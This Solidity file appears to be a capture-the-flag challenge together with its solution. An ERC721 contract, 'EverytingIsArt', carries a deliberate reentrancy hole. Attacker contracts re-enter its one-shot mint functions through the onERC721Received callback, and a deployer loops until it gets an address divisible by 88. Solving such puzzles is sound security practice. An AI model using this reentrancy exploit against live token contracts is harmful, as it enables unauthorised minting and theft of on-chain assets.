pragma solidity ^0.8.0;

// Using  @openzeppelin/contracts@3.2.0
// pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


contract EverytingIsArt is ERC721 {
    using SafeMath for *;

    uint256 public totalMinted;

    bool public hope = true;
    bool public hope2 = true;

    // Deploy by CTFer EOA account
    constructor() public ERC721("All Arts", "AA") {}

    function becomeAnArtist(uint256 _count) public returns (bool) {
        require(_count >= 288, "Why don't you want to be an artist?");

        for (uint256 i = 0; i < _count; i++) {
            uint256 tokenId = totalMinted.add(1);
            _safeMint(msg.sender, tokenId);
            totalMinted = totalMinted.add(1);
        }

        return true;
    }

    function theHope() public returns (bool) {
        require(hope, "Hope broken");
        require(uint160(msg.sender).mod(88) != 0, "Try again!");

        uint256 tokenId = totalMinted.add(1);
        totalMinted = totalMinted.add(1);
        _safeMint(msg.sender, tokenId);

        hope = false;
        return true;
    }

    function hopeIsInSight() public returns (bool) {
        require(hope == false, "Try again1!");
        require(hope2 == true, "Hope broken!");
        require(uint160(msg.sender).mod(88) == 0, "Try again2!");

        uint256 tokenId = totalMinted.add(1);
        totalMinted = totalMinted.add(1);
        _safeMint(msg.sender, tokenId);

        hope2 = false;
        return true;
    }

    // Artist or programmer? Just try again and again.
    function isCompleted() public view returns (bool) {
        require(
            balanceOf(msg.sender) == 288,
            "You are not yet a good artist, you should keep trying."
        );

        return true;
    }
}
contract attack is IERC721Receiver{
    EverytingIsArt art =EverytingIsArt(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);
    uint256 n1 =1;
 
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    )public override returns (bytes4){
       if(n1<105){
           n1++;
           
         art.theHope();
         return this.onERC721Received.selector;
        }
        if(n1==105){
            n1++;
            return this.onERC721Received.selector;
        }
        if(n1>105 &&n1<211){
            n1++;
            art.hopeIsInSight();
            return this.onERC721Received.selector;
        }
        

      return this.onERC721Received.selector;

    }
    function attack1()public {
        art.theHope();
    }
    function attack2()public {
        art.hopeIsInSight();
    }
}
contract attack2 is IERC721Receiver{
    EverytingIsArt art =EverytingIsArt(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9);
    uint256 n1 =1;
 
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    )public override returns (bytes4){
       if(n1<105){
           n1++;
           
         art.hopeIsInSight();
         return this.onERC721Received.selector;
        }
        if(n1==105){
            n1++;
            return this.onERC721Received.selector;
        }
        
        

      return this.onERC721Received.selector;

    }
    function attack()public {
        art.hopeIsInSight();
    }
}

contract deploy{
    attack2 public att;
    function del()public{
        for (uint i =0;i>=0;i++){
            att = new attack2();
            if (uint160(address(att))%88==0){
                break;
            }
        }
    }
}